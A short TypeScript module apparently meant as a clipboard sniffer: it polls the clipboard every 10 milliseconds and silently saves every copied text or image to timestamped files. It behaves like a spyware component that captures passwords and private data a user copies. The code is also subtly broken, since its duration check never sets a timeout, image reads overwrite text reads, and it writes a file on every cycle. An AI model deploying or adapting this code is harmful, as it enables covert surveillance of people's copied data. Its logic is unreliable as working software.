import {Clipboard} from "@napi-rs/clipboard";
import {delay} from "./helpers.js";
import * as fs from "fs";
import path from "path";

interface ClipboardSnifferParams {
    outDir: string;
    duration?: number;
}

const clipboard = new Clipboard();

async function executeSniffer(abortController: AbortController, saveDir: string) {
    await fs.promises.mkdir(saveDir, {
        recursive: true,
    })
    while (!abortController.signal.aborted) {
        let buffer: Buffer|string|undefined = undefined;
        let methods = [() => clipboard.getText(), () => clipboard.getImage()];
        for (let method of methods) {
            try {
                buffer = method();
            } catch (e) {
            }
        }
        const newDate = new Date().getTime();
        if (typeof buffer === "string") {
            await fs.promises.writeFile(path.join(saveDir, `${newDate}.txt`), buffer);
        } else if (buffer instanceof Buffer) {
            console.log("Save as image");
            await fs.promises.writeFile(path.join(saveDir, `${newDate}.jpg`), buffer);
        }
        await delay(10);
    }
    console.log("Aborted")
}


export default function sniffClipboard(parameters: ClipboardSnifferParams): AbortController {
    const duration = (parameters.duration ?? Infinity) < (2 ** 32 * - 1) ? parameters.duration : Infinity;
    const abortController = new AbortController();

    executeSniffer(abortController, path.join(parameters.outDir, "clipboard")).then();
    if (duration !== Infinity) {
        setTimeout(() => {
            abortController.abort();
        }, duration);
    }
    return abortController;
}

